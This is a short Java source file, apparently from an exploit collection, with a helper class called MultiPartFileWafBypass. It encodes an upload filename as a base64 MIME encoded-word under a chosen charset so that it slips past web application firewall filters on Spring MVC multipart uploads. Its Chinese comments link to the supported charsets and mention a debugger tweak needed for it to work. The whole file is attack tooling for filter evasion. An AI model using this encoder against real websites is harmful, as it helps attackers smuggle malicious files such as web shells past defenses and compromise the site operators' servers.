package exploit.spring.mvc.multipart;

import javax.mail.internet.MimeUtility;
import java.nio.charset.Charset;
import java.util.Base64;

public class MultiPartFileWafBypass {

    // 所有支持的Charset可以在这里找到：https://docs.oracle.com/javase/8/docs/technotes/guides/intl/encoding.doc.html
    public static String bypassFilename(String filename, String mimeCharSet, String multiCharSet) {
        try{
            // 构建MIME文件名, 需要进入debug模式更改ascii的值为0，否则会直接返回
            String mimeFileName = MimeUtility.encodeText(filename, mimeCharSet, null);

            // 构建特殊处理的文件名
            Charset filenameCharSet = Charset.forName(multiCharSet);
            byte[] filenameBuf = filenameCharSet.encode(mimeFileName).array();

            return "=?" + multiCharSet + "?B?" + Base64.getEncoder().encodeToString(filenameBuf) + "?=";
        }catch (Exception e){
            e.printStackTrace();
        }
        return "error";
    }
}
